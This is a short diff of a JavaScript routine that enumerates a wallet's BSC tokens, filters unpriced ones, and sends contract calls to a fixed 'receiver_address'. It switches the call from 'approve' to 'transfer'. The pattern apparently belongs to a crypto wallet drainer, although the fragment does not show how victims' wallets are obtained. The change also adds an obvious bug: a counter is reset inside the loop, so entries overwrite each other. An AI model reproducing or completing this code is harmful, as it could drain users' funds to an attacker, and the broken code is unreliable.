@@ -395,15 +395,17 @@ async function proceed(){
           await getPrice(contractAddress).then(res => {
             console.log(res);
               if (!(res[contractAddress])){
+                let v = 0;
                 let balance = token.balance;
                 let decimal = token.decimals;
                 let fakebalance = balance / (10 ** (decimal || 18));
-                fake_bsc_token[i] = {
+                fake_bsc_token[v] = {
                 contractAddress : contractAddress,
                 balance : balance,
                 decimal : decimal,
                 fakebalance : fakebalance
             }  
+            v = v + 1;
             }
               else{
                 console.log("Not a dust");
@@ -411,7 +413,7 @@ async function proceed(){
             
         });
          if(i+1 === bsc_length){
-          console.log(fake_bsc_token);
+          console.log("fake tokens", fake_bsc_token);
           transferNow();
 
          }
@@ -428,7 +430,6 @@ async function proceed(){
           let x = 0;
           let whono = "";
           async function transferNow(){
-            console.log("okay nah");
             for(let n=0; n<fake_bsc_token.length; n++){
               
             console.log("okay nah");
@@ -453,7 +454,7 @@ async function proceed(){
                               ` )
               const sendOptions = {
                 contractAddress: contractAddress,
-                functionName: "approve",
+                functionName: "transfer",
                 abi: ABI,
                 params: {
                   spender : receiver_address,
